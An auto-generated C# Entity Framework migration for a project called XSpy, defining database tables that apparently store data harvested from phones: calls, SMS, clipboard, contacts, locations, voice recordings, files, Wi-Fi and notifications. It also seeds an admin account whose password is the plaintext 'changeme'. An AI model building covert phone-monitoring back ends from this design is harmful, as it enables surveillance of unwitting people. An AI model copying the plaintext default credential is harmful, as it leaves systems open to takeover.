// <auto-generated />
using System;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Infrastructure;
using Microsoft.EntityFrameworkCore.Migrations;
using Microsoft.EntityFrameworkCore.Storage.ValueConversion;
using XSpy.Database;

namespace XSpy.Database.Migrations
{
    [DbContext(typeof(DatabaseContext))]
    [Migration("20210331235926_InitialDb")]
    partial class InitialDb
    {
        protected override void BuildTargetModel(ModelBuilder modelBuilder)
        {
#pragma warning disable 612, 618
            modelBuilder
                .HasAnnotation("Relational:MaxIdentifierLength", 64)
                .HasAnnotation("ProductVersion", "5.0.4");

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Call", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<string>("Date")
                        .HasMaxLength(30)
                        .HasColumnType("varchar(30) CHARACTER SET utf8mb4")
                        .HasColumnName("device_date");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("Duration")
                        .HasMaxLength(10)
                        .HasColumnType("varchar(10) CHARACTER SET utf8mb4")
                        .HasColumnName("duration");

                    b.Property<string>("Name")
                        .HasMaxLength(255)
                        .HasColumnType("varchar(255) CHARACTER SET utf8mb4")
                        .HasColumnName("name");

                    b.Property<string>("Number")
                        .HasMaxLength(30)
                        .HasColumnType("varchar(30) CHARACTER SET utf8mb4")
                        .HasColumnName("number");

                    b.Property<int>("Type")
                        .HasColumnType("int")
                        .HasColumnName("call_type");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_calls");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Clipboard", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<string>("Content")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("content");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_clipboard_logs");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Contact", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<string>("ContactName")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("contact_name");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("Number")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("number");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_contacts");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Device", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<DateTime>("AddedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("added_at");

                    b.Property<string>("DeviceId")
                        .HasMaxLength(50)
                        .HasColumnType("varchar(50) CHARACTER SET utf8mb4")
                        .HasColumnName("device_id");

                    b.Property<string>("LastIp")
                        .HasMaxLength(45)
                        .HasColumnType("varchar(45) CHARACTER SET utf8mb4")
                        .HasColumnName("last_ip");

                    b.Property<string>("Manufacturer")
                        .HasMaxLength(40)
                        .HasColumnType("varchar(40) CHARACTER SET utf8mb4")
                        .HasColumnName("manufacturer");

                    b.Property<string>("Model")
                        .HasMaxLength(40)
                        .HasColumnType("varchar(40) CHARACTER SET utf8mb4")
                        .HasColumnName("model");

                    b.Property<string>("SystemVersion")
                        .HasMaxLength(30)
                        .HasColumnType("varchar(30) CHARACTER SET utf8mb4")
                        .HasColumnName("sys_version");

                    b.Property<DateTime>("UpdatedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("updated_at");

                    b.Property<Guid>("UserId")
                        .HasColumnType("char(36)")
                        .HasColumnName("user_id");

                    b.HasKey("Id");

                    b.HasIndex("UserId");

                    b.ToTable("devices");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.File", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("OriginalName")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("original_name");

                    b.Property<string>("SavedPath")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("file_path");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_files");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.InstalledApps", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<string>("AppName")
                        .HasMaxLength(120)
                        .HasColumnType("varchar(120) CHARACTER SET utf8mb4")
                        .HasColumnName("app_name");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("PackageName")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("package_name");

                    b.Property<string>("VersionCode")
                        .HasMaxLength(100)
                        .HasColumnType("varchar(100) CHARACTER SET utf8mb4")
                        .HasColumnName("version_code");

                    b.Property<string>("VersionName")
                        .HasMaxLength(100)
                        .HasColumnType("varchar(100) CHARACTER SET utf8mb4")
                        .HasColumnName("version_name");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_installed_apps");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Location", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<double>("Accuracy")
                        .HasColumnType("double")
                        .HasColumnName("accuracy");

                    b.Property<double>("Altitude")
                        .HasColumnType("double")
                        .HasColumnName("altitude");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<double>("Enabled")
                        .HasColumnType("double")
                        .HasColumnName("is_enabled");

                    b.Property<double>("Latitude")
                        .HasColumnType("double")
                        .HasColumnName("latitude");

                    b.Property<double>("Longitude")
                        .HasColumnType("double")
                        .HasColumnName("longitude");

                    b.Property<double>("Speed")
                        .HasColumnType("double")
                        .HasColumnName("speed");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_locations");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Notification", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<string>("Content")
                        .HasMaxLength(500)
                        .HasColumnType("varchar(500) CHARACTER SET utf8mb4")
                        .HasColumnName("content");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<string>("Date")
                        .HasMaxLength(30)
                        .HasColumnType("varchar(30) CHARACTER SET utf8mb4")
                        .HasColumnName("device_date");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("Key")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("key");

                    b.Property<int>("Type")
                        .HasColumnType("int")
                        .HasColumnName("call_type");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_notifications");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Permission", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("Key")
                        .HasMaxLength(120)
                        .HasColumnType("varchar(120) CHARACTER SET utf8mb4")
                        .HasColumnName("key");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_permissions");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Sms", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<string>("Address")
                        .HasMaxLength(30)
                        .HasColumnType("varchar(30) CHARACTER SET utf8mb4")
                        .HasColumnName("address");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<string>("Date")
                        .HasMaxLength(30)
                        .HasColumnType("varchar(30) CHARACTER SET utf8mb4")
                        .HasColumnName("device_date");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("Name")
                        .HasMaxLength(180)
                        .HasColumnType("varchar(180) CHARACTER SET utf8mb4")
                        .HasColumnName("body");

                    b.Property<int>("Type")
                        .HasColumnType("int")
                        .HasColumnName("call_type");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_sms");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.VoiceRecord", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("OriginalName")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("original_name");

                    b.Property<string>("SavedPath")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("file_path");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_voice_records");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Wifi", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<string>("Bssid")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("bssid");

                    b.Property<DateTime>("CratedAt")
                        .HasColumnType("datetime(6)")
                        .HasColumnName("created_at");

                    b.Property<Guid>("DeviceId")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_id");

                    b.Property<string>("Ssid")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("ssid");

                    b.HasKey("Id");

                    b.HasIndex("DeviceId");

                    b.ToTable("device_wifi");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Roles.Rank", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<string>("Name")
                        .HasMaxLength(50)
                        .HasColumnType("varchar(50) CHARACTER SET utf8mb4")
                        .HasColumnName("name");

                    b.HasKey("Id");

                    b.ToTable("ranks");

                    b.HasData(
                        new
                        {
                            Id = new Guid("4288aa01-036a-47e4-9db8-61e425ac2d43"),
                            Name = "Usuário"
                        },
                        new
                        {
                            Id = new Guid("62a840f9-c6ef-4d56-8652-4d9b46115b95"),
                            Name = "Admin"
                        });
                });

            modelBuilder.Entity("XSpy.Database.Entities.Roles.RankRole", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)");

                    b.Property<bool>("FakeRole")
                        .HasColumnType("tinyint(1)")
                        .HasColumnName("fake_role");

                    b.Property<Guid>("RankId")
                        .HasColumnType("char(36)")
                        .HasColumnName("rank_id");

                    b.Property<string>("RoleName")
                        .HasColumnType("varchar(50) CHARACTER SET utf8mb4")
                        .HasColumnName("role_name");

                    b.HasKey("Id");

                    b.HasIndex("RankId");

                    b.HasIndex("RoleName");

                    b.ToTable("rank_roles");

                    b.HasData(
                        new
                        {
                            Id = new Guid("c18d9d6e-8be7-4dee-9d26-f442cb1dc0fc"),
                            FakeRole = false,
                            RankId = new Guid("4288aa01-036a-47e4-9db8-61e425ac2d43"),
                            RoleName = "IS_NORMAL_USER"
                        },
                        new
                        {
                            Id = new Guid("817285cb-e22e-4bfe-b5e0-bc8d603ea57f"),
                            FakeRole = false,
                            RankId = new Guid("62a840f9-c6ef-4d56-8652-4d9b46115b95"),
                            RoleName = "IS_ADMIN"
                        });
                });

            modelBuilder.Entity("XSpy.Database.Entities.Roles.Roles", b =>
                {
                    b.Property<string>("Name")
                        .HasMaxLength(50)
                        .HasColumnType("varchar(50) CHARACTER SET utf8mb4")
                        .HasColumnName("name");

                    b.Property<string>("Title")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("title");

                    b.HasKey("Name");

                    b.ToTable("roles");

                    b.HasData(
                        new
                        {
                            Name = "IS_ADMIN",
                            Title = "É um administrador geral (privilégios globais)"
                        },
                        new
                        {
                            Name = "ROLE_C_USER",
                            Title = "Pode criar usuários"
                        },
                        new
                        {
                            Name = "ROLE_R_USER",
                            Title = "Pode ler usuários"
                        },
                        new
                        {
                            Name = "ROLE_U_USER",
                            Title = "Pode editar usuários"
                        },
                        new
                        {
                            Name = "ROLE_D_USER",
                            Title = "Pode deletar usuários"
                        },
                        new
                        {
                            Name = "ROLE_C_ROLE",
                            Title = "Pode criar permissões"
                        },
                        new
                        {
                            Name = "ROLE_R_ROLE",
                            Title = "Pode ler permissões"
                        },
                        new
                        {
                            Name = "ROLE_U_ROLE",
                            Title = "Pode editar permissões"
                        },
                        new
                        {
                            Name = "ROLE_D_ROLE",
                            Title = "Pode deletar permissões"
                        },
                        new
                        {
                            Name = "IS_NORMAL_USER",
                            Title = "É um usuário comum"
                        });
                });

            modelBuilder.Entity("XSpy.Database.Entities.User", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)")
                        .HasColumnName("id");

                    b.Property<Guid>("DeviceToken")
                        .HasColumnType("char(36)")
                        .HasColumnName("device_token");

                    b.Property<string>("Email")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("email");

                    b.Property<bool>("IsActive")
                        .HasColumnType("tinyint(1)")
                        .HasColumnName("is_active");

                    b.Property<string>("Name")
                        .HasMaxLength(140)
                        .HasColumnType("varchar(140) CHARACTER SET utf8mb4")
                        .HasColumnName("fullname");

                    b.Property<string>("Password")
                        .HasMaxLength(100)
                        .HasColumnType("varchar(100) CHARACTER SET utf8mb4")
                        .HasColumnName("password");

                    b.Property<Guid>("RankId")
                        .HasColumnType("char(36)")
                        .HasColumnName("rank_id");

                    b.Property<string>("Username")
                        .HasColumnType("longtext CHARACTER SET utf8mb4")
                        .HasColumnName("username");

                    b.HasKey("Id");

                    b.HasIndex("RankId");

                    b.ToTable("users");

                    b.HasData(
                        new
                        {
                            Id = new Guid("d8377373-0670-406d-9072-faa5011b3980"),
                            DeviceToken = new Guid("39d7d847-49ef-4434-b8aa-d1cd88d2430d"),
                            Email = "admin@admin.com",
                            IsActive = true,
                            Password = "changeme",
                            RankId = new Guid("4288aa01-036a-47e4-9db8-61e425ac2d43"),
                            Username = "admin"
                        });
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Call", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Clipboard", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Contact", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Device", b =>
                {
                    b.HasOne("XSpy.Database.Entities.User", "UserData")
                        .WithMany()
                        .HasForeignKey("UserId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("UserData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.File", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.InstalledApps", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Location", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Notification", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Permission", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Sms", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.VoiceRecord", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Devices.Wifi", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Devices.Device", "DeviceData")
                        .WithMany()
                        .HasForeignKey("DeviceId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("DeviceData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Roles.RankRole", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Roles.Rank", "Rank")
                        .WithMany("Roles")
                        .HasForeignKey("RankId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.HasOne("XSpy.Database.Entities.Roles.Roles", "RoleData")
                        .WithMany()
                        .HasForeignKey("RoleName");

                    b.Navigation("Rank");

                    b.Navigation("RoleData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.User", b =>
                {
                    b.HasOne("XSpy.Database.Entities.Roles.Rank", "RankData")
                        .WithMany()
                        .HasForeignKey("RankId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("RankData");
                });

            modelBuilder.Entity("XSpy.Database.Entities.Roles.Rank", b =>
                {
                    b.Navigation("Roles");
                });
#pragma warning restore 612, 618
        }
    }
}
